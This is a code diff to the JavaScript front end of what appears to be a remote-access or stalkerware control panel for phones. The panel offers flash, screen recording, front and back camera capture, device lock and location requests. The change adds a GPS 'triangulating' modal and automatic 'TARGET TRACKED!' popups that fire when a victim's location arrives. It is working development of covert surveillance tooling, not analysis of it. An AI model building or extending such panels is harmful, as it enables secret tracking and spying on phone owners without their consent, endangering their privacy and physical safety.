@@ -669,7 +669,10 @@
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
-            else if (action === 'get_location') { sendCommand('get_location'); }
+            else if (action === 'get_location') {
+                sendCommand('get_location');
+                openModal('get_location');
+            }
             else if (action === 'lock') openModal('lock');
             else openModal(action);
         };
@@ -686,7 +689,12 @@
             document.getElementById('modal-title').innerText = type.toUpperCase();
             const body = document.getElementById('modal-body');
             const footer = document.getElementById('modal-footer');
-            body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
+            
+            if (type === 'get_location') {
+                body.innerHTML = `<div class="data-loader"><i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:60%"></div></div><span>Triangulating high-accuracy GPS...</span></div>`;
+            } else {
+                body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
+            }
             footer.innerHTML = '';
 
             // request fresh data
@@ -906,6 +914,21 @@
                     clientDataCache[selectedClientId] = cdata;
                     
                     if (currentModal) renderModalContent();
+
+                    // --- AUTO POPUP FOR LOCATION UPDATES ---
+                    if (cdata.location_status === 'requesting' || cdata.location_status === 'pending') {
+                        if (lastDataHashes['loc_status'] !== 'pending') {
+                            lastDataHashes['loc_status'] = 'pending';
+                            showPopup('info', '🛰️ Triangulating target GPS...');
+                        }
+                    } else if (cdata.location_status === 'success' && cdata.location_url) {
+                        const locHash = selectedClientId + cdata.location_url + (cdata.location_image || '');
+                        if (lastDataHashes['auto_loc'] !== locHash) {
+                            lastDataHashes['auto_loc'] = locHash;
+                            lastDataHashes['loc_status'] = 'success';
+                            showPopup('info', '🎯 TARGET TRACKED! Open modal to view map.', 10000);
+                        }
+                    }
 
                     // Real-time notifications from notifications list
                     if (cdata.notifications?.length) {
